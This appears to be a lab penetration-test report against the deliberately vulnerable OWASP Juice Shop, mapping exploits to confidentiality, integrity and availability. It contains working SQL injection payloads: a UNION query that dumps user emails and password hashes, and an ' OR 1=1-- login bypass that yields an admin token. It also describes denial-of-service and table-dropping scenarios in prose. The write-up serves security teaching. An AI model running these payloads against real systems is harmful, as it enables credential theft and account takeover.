# Phase 2: Vulnerability Exploitation & CIA Triad Impact

## 1. Objective
Demonstrate the practical impact of identified vulnerabilities by mapping successful exploits directly against the three pillars of the CIA Triad: Confidentiality, Integrity, and Availability.

---

## 2. [C] Confidentiality: Data Exfiltration via UNION-based SQLi

* **Vulnerable Endpoint:** `GET /rest/products/search?q=`
* **Target Asset:** User authentication records table (`Users`)
* **Impact:** Complete exposure of user identifiers and password hashes to unauthenticated clients.

### Technical Methodology & Step-by-Step Execution

#### Step 1: Column Count Determination & Field Mapping
To construct a valid `UNION SELECT` statement, the injected query must match the exact number of columns returned by the original product search query and ensure compatible data types across positions.

* **Injected Probe:**
  ```sql
  ')) UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9--
  ```
* **URL-Encoded Request:**
  ```http
  GET /rest/products/search?q=%27%29%29%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9-- HTTP/1.1
  Host: localhost:3000
  ```
* **Observation:** The backend accepted the payload with status `200 OK`. The response JSON mapped index `2` to the `name` field and index `3` to the `description` field, confirming that positions 2 and 3 accept and reflect arbitrary string data.

![Column Determination PoC](../images/05_step1_column_mapping.png)

---

#### Step 2: Database Schema Enumeration via `sqlite_master`
Rather than guessing table or column structures, the SQLite system catalog (`sqlite_master`) was queried to extract exact schema definitions. A filter condition (`WHERE type='table' AND tbl_name='Users'`) was appended to eliminate `NULL` values from database indexes that previously triggered backend runtime exceptions.

* **Injected Probe:**
  ```sql
  ')) UNION SELECT 1, tbl_name, sql, 4, 5, 6, 7, 8, 9 FROM sqlite_master WHERE type='table' AND tbl_name='Users'--
  ```
* **Extracted Schema Definition (DDL):**
  ```sql
  CREATE TABLE `Users` (
    `id` INTEGER PRIMARY KEY AUTOINCREMENT,
    `username` VARCHAR(255) DEFAULT '',
    `email` VARCHAR(255) UNIQUE,
    `password` VARCHAR(255),
    `role` VARCHAR(255) DEFAULT 'customer',
    `deluxeToken` VARCHAR(255) DEFAULT '',
    `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0',
    `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg',
    `totpSecret` VARCHAR(255) DEFAULT '',
    `isActive` BOOLEAN DEFAULT 1,
    `createdAt` DATETIME NOT NULL,
    `updatedAt` DATETIME NOT NULL,
    `deletedAt` DATETIME
  )
  ```
* **Observation:** The extraction verified the table name `Users` and confirmed that authentication data is stored in the `email` and `password` columns.

![Schema Extraction PoC](../images/05_step2_schema_extraction.png)

---

#### Step 3: Targeted Credential Extraction
Using the validated column map, the final payload was assembled to extract records from `Users`, projecting `email` into the product name slot and `password` into the description slot.

* **Final Payload:**
  ```sql
  ')) UNION SELECT 1, email, password, 4, 5, 6, 7, 8, 9 FROM Users--
  ```
* **Extracted Data (Sample Response):**
  ```json
  {
    "id": 1,
    "name": "admin@juice-sh.op",
    "description": "0192023a7bbd73250516f069df18b500",
    "price": 4,
    "deluxePrice": 5,
    "image": 6,
    "createdAt": 7,
    "updatedAt": 8,
    "deletedAt": 9
  }
  ```
* **Result:** Unauthenticated exfiltration of all user records, complete with associated password hashes.

![Confidentiality Breach PoC](../images/05_step3_data_exfiltration.png)

---

## 3. [I] Integrity: Authentication Bypass

* **Vulnerable Endpoint:** `POST /rest/user/login`
* **Target Functionality:** User authentication logic
* **Impact:** Administrative account takeover without valid credentials.

### Technical Execution
The login handler concatenates user-supplied email input directly into the authentication query. Supplying a boolean tautology (`' OR 1=1--`) forces the query condition to evaluate to `TRUE`, while the comment token (`--`) truncates the backend password verification routine entirely.

* **Payload:**
  ```json
  {
    "email": "' OR 1=1--",
    "password": "arbitrary_string"
  }
  ```
* **Result:** The backend logs the client in as the first record in the database (`admin@juice-sh.op`), returning a valid JWT session token and HTTP status `200 OK`.

![Integrity Breach PoC](../images/06_integrity_poc.png)

---

## 4. [A] Availability: Service Disruption Analysis

* **Vulnerable Vector:** Resource exhaustion and backend blocking via unoptimized database queries.
* **Impact:** Denial of Service (DoS) and application unresponsiveness.

### Technical Analysis & Threat Modeling
* **Algorithmic Disruption:** Exploitation vectors in SQLite and Node.js backend pipelines allow injection of complex wildcard patterns or computationally intensive subqueries that exhaust event-loop resources, causing significant response latency for legitimate users.
* **Data Sabotage Scenario:** An attacker possessing write-access SQL injection or administrative privileges could execute non-recoverable database operations (e.g., dropping or truncating tables), causing immediate operational downtime and total availability failure.

![Availability Impact Analysis](../images/07_availability_poc.png)
